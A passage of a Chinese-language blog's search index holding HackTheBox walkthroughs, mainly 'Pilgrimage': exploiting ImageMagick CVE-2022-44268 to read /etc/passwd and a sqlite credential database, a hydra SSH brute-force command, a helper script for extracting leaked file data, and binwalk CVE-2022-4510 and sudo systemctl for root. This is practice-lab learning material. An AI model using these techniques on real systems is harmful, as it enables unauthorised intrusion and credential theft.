alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2TA0Pwcolb.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2OZHx8W2HL.png" alt=""></p><h3 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h3><p>puma用户可以免密使用sudo执行 <code>/usr/bin/systemctl</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ccYEP8L9x_.png" alt=""></p><p>根据CTFOBins的指示，我们可以滥用sudo权限提权至root</p><p><a href="https://gtfobins.github.io/gtfobins/systemctl/" title="https://gtfobins.github.io/gtfobins/systemctl/">https://gtfobins.github.io/gtfobins/systemctl/</a></p><p>这里先搞个bash好操作一些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ script /dev/null /bin/bash<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mTATfJvJ7l.png" alt=""></p><p>拿下！但是感觉SSRF那里真的有点需要脑洞了，不太友好。提权部分还挺简单。</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pilgrimage - HackTheBox</title>
    <link href="/2023/07/15/Pilgrimage-HackTheBox/"/>
    <url>/2023/07/15/Pilgrimage-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>Noob 的 HackTheBox 之旅</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>VPS：43.134.44.115</p><p>Mac：localhost</p><p>Burpsuite</p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><ol><li>VPS通过OpenVPN连接HacktheBox</li><li>Mac通过端口转发将7080端口转发到VPS<br><code>ssh -qTfnN -D 7080 user@43.134.44.115</code></li><li>浏览器通过Burpsuite 将数据代理到7080端口</li></ol><p>这样就可以在本地的浏览器上通过Burpsuite流畅的测HacktheBox的靶机了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.40.38_0Z6PAL7BFH.png" alt=""></p><h3 id="getShell过程"><a href="#getShell过程" class="headerlink" title="getShell过程"></a>getShell过程</h3><p>先体验一下功能，从PHPSESSID看后端语言应该是PHP</p><h4 id="上传功能"><a href="#上传功能" class="headerlink" title="上传功能"></a>上传功能</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.47.17_kohrftGCRO.png" alt=""></p><p>试了一下就算上传PHP后缀也会被处理成jpeg文件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.48.22_uiGRMegOtP.png" alt=""></p><h4 id="登录注册功能"><a href="#登录注册功能" class="headerlink" title="登录注册功能"></a>登录注册功能</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.51.25_Y2DHrHU3jp.png" alt=""></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.52.38_j7X0NQnfse.png" alt=""></p><p>发现git泄漏，使用GitHack下载项目代码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.54.49_jdE_HMMt8T.png" alt=""></p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>打包代码下载到本地进行代码审计</p><p><code>tar -zcvf pilgrimage.zip pilgrimage.htb</code></p><p>登录和注册功能两个参数都使用了预编译，注入无望</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.22.33_ptkVK9pfwc.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.23.08_mT42LgcO03.png" alt=""></p><p>上传功能这里使用了magick去处理图片，并且会将后缀名设置成jpeg和png。上传无望</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.26.17__e5mG9nXJ_.png" alt=""></p><p>imagemagick这东西之前有著名的RCE漏洞，而且git泄漏这里还有magick这个文件。这里会不会存在nday呢</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.33.59_lpO2xVC0d1.png" alt=""></p><p>通过执行命令查到版本号，我们可以去exploitdb查一下有没有可利用的nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_guPmAiygOf.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.43.08_FWb7QWQS85.png" alt=""></p><p>有个任意文件读取可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 纯文本"># Exploit Title: ImageMagick  7.1.0-49 - Arbitrary File Read<br># Google Dork: N/A<br># Date: 06/02/2023<br># Exploit Author: Cristian &#x27;void&#x27; Giustini<br># Vendor Homepage: https://imagemagick.org/<br># Software Link: https://imagemagick.org/<br># Version: &lt;= 7.1.0-49<br># Tested on: 7.1.0-49 and 6.9.11-60<br># CVE : CVE-2022-44268 (CVE Owner: Metabase Q Team<br>https://www.metabaseq.com/imagemagick-zero-days/)<br># Exploit pre-requirements: Rust<br><br><br># PoC : https://github.com/voidz0r/CVE-2022-44268<br></code></pre></td></tr></table></figure><h4 id="CVE-2022-44268"><a href="#CVE-2022-44268" class="headerlink" title="CVE-2022-44268"></a>CVE-2022-44268</h4><p>研究下POC的用法：</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.47.01_l39CB6Z4lT.png" alt=""></p><p>先通过项目给的工具指定要读取的文件，然后将生成image.png交给imageMagick处理，这一步交给存在漏洞的Web服务器去触发漏洞读取指定文件，然后将图片下载回来使用identify输出读取到的文件内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Ty3jJ8z8q.png" alt=""></p><p><code>identify -verbose oout.png</code></p><p>输出读取到的内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oag5we8Y1F.png" alt=""></p><p>这里就获取到了 /etc/passwd 文件内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_My0Ds4YEh3.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_x5M4BI1MNE.png" alt=""></p><p>只有emily和root用户是可以登录到bash的</p><p>这里想到尝试一下爆破，直接爆破root应该不可能，但可以试一下emily</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l emily -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt ssh://10.10.11.219 -t 4<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EI3NuikA9X.png" alt=""></p><p>然后发现好像不太适合，爆破速度特别慢。想了一下公共靶机应该也不希望用户一起爆破</p><p>那还是回到任意文件读取这个漏洞吧</p><p>写个脚本简化流程，研究了一下identify命令。如果只需要Raw profile type部分的内容，需要执行：</p><p><code>identify  -format &quot;%[Raw profile type]&quot; -verbose oout.png</code></p><p>链接：<a href="https://www.imagemagick.org/script/escape.php" title="https://www.imagemagick.org/script/escape.php">https://www.imagemagick.org/script/escape.php</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">import sys<br>import requests<br>import subprocess<br><br>def run_identify(image_path):<br>    <span class="hljs-built_in">command</span> = [<span class="hljs-string">&#x27;identify&#x27;</span>, <span class="hljs-string">&#x27;-format&#x27;</span>, <span class="hljs-string">&#x27;%[Raw profile type]&#x27;</span>, <span class="hljs-string">&#x27;-verbose&#x27;</span>, image_path]<br>    <br>    try:<br>        output = subprocess.check_output(<span class="hljs-built_in">command</span>, stderr=subprocess.STDOUT, universal_newlines=True)<br>        <span class="hljs-comment">#这里[10:-8]是为了除去1473和verbose等无效数据</span><br>        <span class="hljs-built_in">print</span>(bytes.fromhex(output[10:]))<br>    <br>    except subprocess.CalledProcessError as e:<br>        <span class="hljs-built_in">print</span>(e.output)<br><br>def download_image(url, path):<br>    try:<br>        response = requests.get(url)<br>        response.raise_for_status()<br>        with open(path, <span class="hljs-string">&#x27;wb&#x27;</span>) as file:<br>            file.write(response.content)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;图片下载成功&#x27;</span>)<br>    except requests.exceptions.RequestException as e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;图片下载失败:&#x27;</span>, str(e))<br><br><br><br><span class="hljs-keyword">if</span> len(sys.argv) &lt; 2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请提供图片路径作为参数&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    image_path = sys.argv[1]<br>    url = sys.argv[2]<br>    download_image(url, image_path)<br>    run_identify(image_path)<br></code></pre></td></tr></table></figure><p>但这里又不知道应该读哪些文件好了，想了挺久会想起Web服务用的是sqlite的数据库。我们可以把sqlite数据库文件读取，看看数据里面能不能发现什么</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CRWqLejbJU.png" alt=""></p><p>下载数据库文件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BV8rRtBuYs.png" alt=""></p><p>用命令将文件保存后处理一下，主要是删除无用字符（b’）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python identify.py out.png http://pilgrimage.htb/shrunk/64b1faf7e3216.png &gt; sqli.db<br><span class="hljs-comment"># 从16进制转为二进制文件</span><br><span class="hljs-built_in">cat</span> sqli.db | xxd -r -p &gt; sqlite.db<br><br>-r 表示要进行逆向转换，从十六进制转换为二进制<br>-p 表示输入的十六进制数据是连续的，没有空格或其他字符分隔<br><br></code></pre></td></tr></table></figure><p>学习一下sqlite命令：<a href="https://www.runoob.com/sqlite/sqlite-commands.html" title="https://www.runoob.com/sqlite/sqlite-commands.html">https://www.runoob.com/sqlite/sqlite-commands.html</a></p><p>从数据库中可以查到用户emily和密码，emily之前在 /etc/passwd文件里见到过了，我直接ssh</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iTfAwExvk4.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BBjGnqlCT8.png" alt=""></p><p>登录成功，是个普通用户，拿到了user.txt 中的user flag。下一步提权</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Nhu_Ax6Ay2.png" alt=""></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>内核很新，sudo和SUID也没发现可利用的</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Zfg4pZC7_X.png" alt=""></p><p>直接上提权脚本看看，先看看查CVE的linux-exploit-suggester。对比一下内核版本，没一个靠谱的…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HM0wzNqmPf.png" alt=""></p><p>再看看PEASS，这个脚本集成了非常多Linux提权脚本</p><p>在观察进程的时候发现root运行了malwarescan.sh脚本</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TNR96o0YdF.png" alt=""></p><p>看看脚本里都是什么内容：</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_21Q1F8iW4m.png" alt=""></p><p>通过inotifywait创建了一个关于<code>/var/www/pilgrimage.htb/shrunk/</code> 的监控，使用binwalk提取文件内容。看起来像是个简单的WAF，不允许文件内存在blacklist中的字符串</p><p>binwalk也有个著名的RCE漏洞（CVE-2022-4510），看看版本正好可以使用，美滋滋</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zd12AgkHVi.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MtbG9AW8TR.png" alt=""></p><p>输入参数运行脚本，就会生成binwalk_exploit.png，再上传到<code>var/www/pilgrimage.htb/shrunk/</code>目录让root运行binwalk触发即可</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ttjUd88fZV.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_z2qffOyWtE.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YSwZYSA_-S.png" alt=""></p><p>拿下！从Noob进化成Script Kiddie</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__V0QBNzAgu.png" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Remake</title>
    <link href="/2023/07/13/Remake/"/>
    <url>/2023/07/13/Remake/</url>
    
    <content type="html"><![CDATA[<p>Remake…</p>]]></content>
    
    
    
    <tags>
      
      <tag>Remake</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
